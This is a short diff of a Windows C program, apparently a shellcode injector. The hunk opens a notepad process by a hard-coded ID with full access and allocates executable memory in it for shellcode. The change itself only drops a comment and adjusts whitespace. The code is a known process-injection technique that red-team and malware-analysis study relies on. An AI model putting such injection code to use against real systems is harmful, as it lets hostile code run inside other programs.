@@ -51,8 +51,8 @@ int main()
     void *exec_mem;//pointer to store shellcode in the memory.
 
     //used to open a local process - want to specify the remote process pid 
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 3164); // Process ID for notepad >> 3164
-
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 3164);
+    
     //Allcate the memory in the remote process.
     exec_mem = VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
